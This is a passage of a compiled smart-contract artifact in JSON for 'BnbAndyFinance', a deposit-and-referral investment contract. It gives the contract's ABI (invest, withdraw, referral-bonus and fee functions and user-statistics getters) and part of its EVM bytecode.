{
  "contractName": "BnbAndyFinance",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "wallet",
          "type": "address"
        },
        {
          "internalType": "address payable",
          "name": "dev_wallet",
          "type": "address"
        },
        {
          "internalType": "address payable",
          "name": "ins_wallet",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "totalAmount",
          "type": "uint256"
        }
      ],
      "name": "FeePayed",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint8",
          "name": "plan",
          "type": "uint8"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "NewDeposit",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "user",
          "type": "address"
        }
      ],
      "name": "Newbie",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "referrer",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "referral",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "uint256",
          "name": "level",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "RefBonus",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Withdrawn",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "DEV_FEE",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "DEV_FEE_WT",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "INVEST_MIN_AMOUNT",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "PERCENTS_DIVIDER",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "PROJECT_FEE",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "PROJECT_FEE_WT",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "REFERRAL_PERCENTS",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "TIME_STEP",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "TOTAL_REF",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "available",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "commissionWallet",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "devWallet",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "insurance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "insuranceWallet",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "last_deposit",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "started",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "totalInvested",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "isOwner",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "setInsurance",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "referrer",
          "type": "address"
        }
      ],
      "name": "invest",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdrawRef",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdrawns",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getContractBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "getPlanInfo",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "time",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "percent",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserDividends",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserActivePlansAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserTotalWithdrawn",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserCheckpoint",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserReferrer",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserDownlineCount",
      "outputs": [
        {
          "internalType": "uint256[2]",
          "name": "referrals",
          "type": "uint256[2]"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserTotalReferrals",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserReferralBonus",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserReferralTotalBonus",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserReferralWithdrawn",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserAvailable",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserAmountOfDeposits",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserTotalDeposits",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserDepositInfo",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "plan",
          "type": "uint8"
        },
        {
          "internalType": "uint256",
          "name": "percent",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "start",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "finish",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "index",
          "type": "uint256"
        }
      ],
      "name": "getUserActions",
      "outputs": [
        {
          "internalType": "uint8[]",
          "name": "",
          "type": "uint8[]"
        },
        {
          "internalType": "uint256[]",
          "name": "",
          "type": "uint256[]"
        },
        {
          "internalType": "uint256[]",
          "name": "",
          "type": "uint256[]"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserActionLength",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "getSiteInfo",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "_totalInvested",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "_totalBonus",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserInfo",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "totalDeposit",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "totalWithdrawn",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "totalReferrals",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x60806040526040518060400160405280606460ff168152602001603260ff1681525060009060026200003392919062000205565b503480156200004157600080fd5b506040516200471b3803806200471b8339818101604052810190620000679190620002e5565b6200008183620001f2640100000000026401000000009004565b156200008c57600080fd5b33600760016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555082600860006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600960006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600a60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600260405180604001604052806101818152602001600781525090806001815401808255809150506001900390600052602060002090600202016000909190919091506000820151816000015560208201518160010155505050505062000341565b600080823b905060008111915050919050565b82805482825590600052602060002090810192821562000249579160200282015b8281111562000248578251829060ff1690559160200191906001019062000226565b5b5090506200025891906200025c565b5090565b5b80821115620002775760008160009055506001016200025d565b5090565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000620002ad8262000280565b9050919050565b620002bf81620002a0565b8114620002cb57600080fd5b50565b600081519050620002df81620002b4565b92915050565b6000806000606084860312156200030157620003006200027b565b5b60006200031186828701620002ce565b93505060206200032486828701620002ce565b92505060406200033786828701620002ce565b9150509250925092565b6143ca80620003516000396000f3fe608060405260043610610284576000357c0100000000000000000000000000000000000000000000000000000000900480637e3abeea11610161578063c4716d76116100d3578063e85abe0911610097578063e85abe09146109a9578063f009086b146109e6578063f6b9177714610a23578063fb4cb32b14610a4e578063fbfcb27914610a8b578063fea3c34314610ac857610284565b8063c4716d76146108d6578063ca7dd83514610913578063d0c857e31461092a578063d7ffca9114610941578063e262113e1461097e57610284565b80639da44c9a116101255780639da44c9a146107855780639f1a3756146107b1578063a866bc75146107dc578063a8aeb6c214610819578063b3a7834d14610856578063be879b9d1461089757610284565b80637e3abeea1461069c5780638da5cb5b146106d95780638ea5220f146107045780638f32d59b1461072f57806397c0262a1461075a57610284565b806348c37203116101fa5780635216aeec116101be5780635216aeec14610583578063600d20ce146105ae5780636386c1c7146105eb5780636bb185561461062a5780636f9fb98a146106675780637b098ed61461069257610284565b806348c372031461049957806348d44bd1146104d65780634bc4e085146105015780634ce870531461052c5780635038e06c1461055857610284565b8063153ab9df1161024c578063153ab9df146103875780631f2698ab146103c457806332bc298c146103ef57806336144c9a1461041a5780633ccfd60b14610457578063436a88c11461046e57610284565b806301c234a81461028957806303a93c0c146102b457806303f9c793146102f1578063040a772e1461030d57806310098ad51461034a575b600080fd5b34801561029557600080fd5b5061029e610b05565b6040516102ab919061374f565b60405180910390f35b3480156102c057600080fd5b506102db60048036038101906102d691906137cd565b610b0b565b6040516102e891906138a5565b60405180910390f35b61030b600480360381019061030691906137cd565b610b98565b005b34801561031957600080fd5b50610334600480360381019061032f91906137cd565b61182c565b604051610341919061374f565b60405180910390f35b34801561035657600080fd5b50610371600480360381019061036c91906137cd565b611ae6565b60405161037e919061374f565b60405180910390f35b34801561039357600080fd5b506103ae60048036038101906103a991906137cd565b611afe565b6040516103bb919061374f565b60405180910390f35b3480156103d057600080fd5b506103d9611b2a565b6040516103e691906138db565b60405180910390f35b3480156103fb57600080fd5b50610404611b3d565b604051610411919061374f565b60405180910390f35b34801561042657600080fd5b50610441600480360381019061043c91906137cd565b611b44565b60405161044e9190613905565b60405180910390f35b34801561046357600080fd5b5061046c611bb0565b005b34801561047a57600080fd5b506104836120bc565b604051610490919061374f565b60405180910390f35b3480156104a557600080fd5b506104c060048036038101906104bb91906137cd565b6120c1565b6040516104cd919061374f565b60405180910390f35b3480156104e257600080fd5b506104eb61210d565b6040516104f8919061374f565b60405180910390f35b34801561050d57600080fd5b50610516612112565b604051610523919061374f565b60405180910390f35b34801561053857600080fd5b50610541612117565b60405161054f929190613920565b60405180910390f35b34801561056457600080fd5b5061056d61214f565b60405161057a919061396a565b60405180910390f35b34801561058f57600080fd5b50610598612175565b6040516105a5919061374f565b60405180910390f35b3480156105ba57600080fd5b506105d560048036038101906105d091906139b1565b61217b565b6040516105e2919061374f565b60405180910390f35b3480156105f757600080fd5b50610612600480360381019061060d91906137cd565b61219f565b604051610621939291906139de565b60405180910390f35b34801561063657600080fd5b50610651600480360381019061064c91906137cd565b6121cc565b60405161065e919061374f565b60405180910390f35b34801561067357600080fd5b5061067c61226c565b604051610689919061374f565b60405180910390f35b61069a61228b565b005b3480156106a857600080fd5b506106c360048036038101906106be91906137cd565b612436565b6040516106d0919061374f565b60405180910390f35b3480156106e557600080fd5b506106ee61251e565b6040516106fb9190613905565b60405180910390f35b34801561071057600080fd5b50610719612548565b604051610726919061396a565b60405180910390f35b34801561073b57600080fd5b5061074461256e565b60405161075191906138db565b60405180910390f35b34801561076657600080fd5b5061076f6125c6565b60405161077c919061396a565b60405180910390f35b34801561079157600080fd5b5061079a6125ec565b6040516107a8929190613920565b60405180910390f35b3480156107bd57600080fd5b506107c6612645565b6040516107d3919061374f565b60405180910390f35b3480156107e857600080fd5b5061080360048036038101906107fe91906137cd565b61264a565b604051610810919061374f565b60405180910390f35b34801561082557600080fd5b50610840600480360381019061083b91906137cd565b612699565b60405161084d919061374f565b60405180910390f35b34801561086257600080fd5b5061087d600480360381019061087891906137cd565b6126e8565b60405161088e959493929190613a31565b60405180910390f35b3480156108a357600080fd5b506108be60048036038101906108b99190613a84565b6128a6565b6040516108cd93929190613c19565b60405180910390f35b3480156108e257600080fd5b506108fd60048036038101906108f891906137cd565b612bd8565b60405161090a919061374f565b60405180910390f35b34801561091f57600080fd5b50610928612bf0565b005b34801561093657600080fd5b5061093f613030565b005b34801561094d57600080fd5b50610968600480360381019061096391906137cd565b613119565b604051610975919061374f565b60405180910390f35b34801561098a57600080fd5b50610993613165565b6040516109a0919061374f565b60405180910390f35b3480156109b557600080fd5b506109d060048036038101906109cb91906137cd565b613170565b6040516109dd919061374f565b60405180910390f35b3480156109f257600080fd5b50610a0d6004803603810190610a0891906137cd565b6131bc565b604051610a1a919061374f565b60405180910390f35b348015610a2f57600080fd5b50610a386133bb565b604051610a45919061374f565b60405180910390f35b348015610a5a57600080fd5b50610a756004803603810190610a7091906137cd565b6133c0565b604051610a82919061374f565b60405180910390f35b348015610a9757600080fd5b50610ab26004803603810190610aad91906137cd565b61340c565b604051610abf919061374f565b60405180910390f35b348015610ad457600080fd5b50610aef6004803603810190610aea91906137cd565b6134cd565b604051610afc919061374f565b60405180910390f35b6103e881565b610b13613714565b600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301600280602002604051908101604052809291908260028015610b8c576020028201915b815481526020019060010190808311610b78575b50505050509050919050565b6000600760009054906101000a900460ff16610c5f57600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1603610c23576001600760006101000a81548160ff021916908315150217905550610c5e565b6040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c5590613cc2565b60405180910390fd5b5b6000600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610cf4600a600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546134e590919063ffffffff16565b610cfe9190613d11565b9050662386f26fc10000341015610d1457600080fd5b803411610d56576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d4d90613db7565b60405180910390fd5b60018260ff1610610d9c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d9390613e23565b60405180910390fd5b6000610dc66103e8610db8601e3461354390919063ffffffff16565b6134e590919063ffffffff16565b90506000610df26103e8610de460143461354390919063ffffffff16565b6134e590919063ffffffff16565b9050600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050158015610e5c573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c183604051610ea3919061374f565b60405180910390a2600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015610f13573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c182604051610f5a919061374f565b60405180910390a26000600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000209050600073ffffffffffffffffffffffffffffffffffffffff168160020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1603611277576000600360008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000018054905011801561107e57503373ffffffffffffffffffffffffffffffffffffffff168673ffffffffffffffffffffffffffffffffffffffff1614155b156110c757858160020160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b60008160020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060005b600281101561127457600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161461125c576111996001600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301836002811061118957611188613e43565b5b01546135bd90919063ffffffff16565b600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030182600281106111ed576111ec613e43565b5b0181905550600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169150611261565b611274565b808061126c90613e72565b9150506110f3565b50505b600073ffffffffffffffffffffffffffffffffffffffff168160020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146115a35760008160020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060005b60028110156115a057600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161461158857600061137f6103e86113716000858154811061135757611356613e43565b5b90600052602060002001543461354390919063ffffffff16565b6134e590919063ffffffff16565b90506113d681600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501546135bd90919063ffffffff16565b600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005018190555061147181600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601546135bd90919063ffffffff16565b600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060181905550813373ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fd41f7e766eebcc7ff42b11ac8691bdf864db4afc0c55e71d629d54edce460d9884604051611515919061374f565b60405180910390a4600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1692505061158d565b6115a0565b808061159890613e72565b9150506112fb565b50505b60008160000180549050036115f3574281600101819055507f9fd565cd14c3c391679eb0cad12a14dcf7534e9d3462bcb9b67a098a9bbbc24a336040516115ea9190613905565b60405180910390a15b8060000160405180606001604052808760ff16815260200134815260200142815250908060018154018082558091505060019003906000526020600020906003020160009091909190915060008201518160000160006101000a81548160ff021916908360ff16021790555060208201518160010155604082015181600201555050806008016040518060600160405280600060ff16815260200134815260200142815250908060018154018082558091505060019003906000526020600020906003020160009091909190915060008201518160000160006101000a81548160ff021916908360ff1602179055506020820151816001015560408201518160020155505034600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550611764606461175661010e3461354390919063ffffffff16565b6134e590919063ffffffff16565b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546117b29190613d11565b925050819055506117ce346001546135bd90919063ffffffff16565b6001819055503373ffffffffffffffffffffffffffffffffffffffff167f3a89eb89956dcf6537585a2372d4e629e18622cce06c2b4fee6301ae0840e241863460405161181c929190613eba565b60405180910390a2505050505050565b600080600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000209050600080600090505b8260000180549050811015611adb5760006119346118fe6201518060028760000186815481106118ab576118aa613e43565b5b906000526020600020906003020160000160009054906101000a900460ff1660ff16815481106118de576118dd613e43565b5b90600052602060002090600202016000015461354390919063ffffffff16565b85600001848154811061191457611913613e43565b5b9060005260206000209060030201600201546135bd90919063ffffffff16565b90508084600101541015611ac75760006119ee6103e86119e0600288600001878154811061196557611964613e43565b5b906000526020600020906003020160000160009054906101000a900460ff1660ff168154811061199857611997613e43565b5b9060005260206000209060020201600101548860000187815481106119c0576119bf613e43565b5b90600052602060002090600302016001015461354390919063ffffffff16565b6134e590919063ffffffff16565b905060008560010154866000018581548110611a0d57611a0c613e43565b5b90600052602060002090600302016002015411611a2e578560010154611a57565b856000018481548110611a4457611a43613e43565b5b9060005260206000209060030201600201545b90506000428410611a685742611a6a565b835b905080821015611ac357611ac0611ab162015180611aa3611a94868661361b90919063ffffffff16565b8761354390919063ffffffff16565b6134e590919063ffffffff16565b876135bd90919063ffffffff16565b95505b5050505b508080611ad390613e72565b915050611878565b508092505050919050565b60066020528060005260406000206000915090505481565b6000611b23611b0c8361182c565b611b1584613170565b6135bd90919063ffffffff16565b9050919050565b600760009054906101000a900460ff1681565b6201518081565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b7f9fd565cd14c3c391679eb0cad12a14dcf7534e9d3462bcb9b67a098a9bbbc24a33604051611bdf9190613905565b60405180910390a16000600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002090506000611c353361182c565b90506000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905080821115611c87578091505b6000611cb16103e8611ca360288661354390919063ffffffff16565b6134e590919063ffffffff16565b90506000611cdd6103e8611ccf600a8761354390919063ffffffff16565b6134e590919063ffffffff16565b9050600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050158015611d47573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c183604051611d8e919061374f565b60405180910390a2600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015611dfe573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c182604051611e45919061374f565b60405180910390a260008411611e90576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611e8790613f2f565b60405180910390fd5b428560010181905550611eb08486600701546135bd90919063ffffffff16565b85600701819055506000611ef3611ee46064611ed660058961354390919063ffffffff16565b6134e590919063ffffffff16565b8661361b90919063ffffffff16565b90503373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015611f3b573d6000803e3d6000fd5b5084600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254611f8b9190613f4f565b925050819055506000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205403611fe357611fe23361367a565b5b856008016040518060600160405280600160ff16815260200187815260200142815250908060018154018082558091505060019003906000526020600020906003020160009091909190915060008201518160000160006101000a81548160ff021916908360ff160217905550602082015181600101556040820151816002015550503373ffffffffffffffffffffffffffffffffffffffff167f7084f5476618d8e60b11ef0d7d3f06914655adb8793e28ff7f018d4c76d505d5866040516120ac919061374f565b60405180910390a2505050505050565b601481565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673fffffffffffffff